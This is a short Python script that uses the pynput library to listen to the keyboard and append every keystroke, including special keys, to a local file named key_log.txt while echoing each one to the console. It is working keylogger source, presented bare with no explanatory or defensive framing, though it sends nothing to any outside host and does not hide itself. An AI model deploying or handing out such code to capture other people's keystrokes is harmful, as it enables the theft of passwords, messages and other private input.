from pynput import keyboard
log_file = "key_log.txt"
open(log_file, "a").close()
def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{key.char}\n")  
            f.flush()  
            print(f"Logged: {key.char}")  
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{key}\n")  
            f.flush()
            print(f"Logged: {key}")  
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

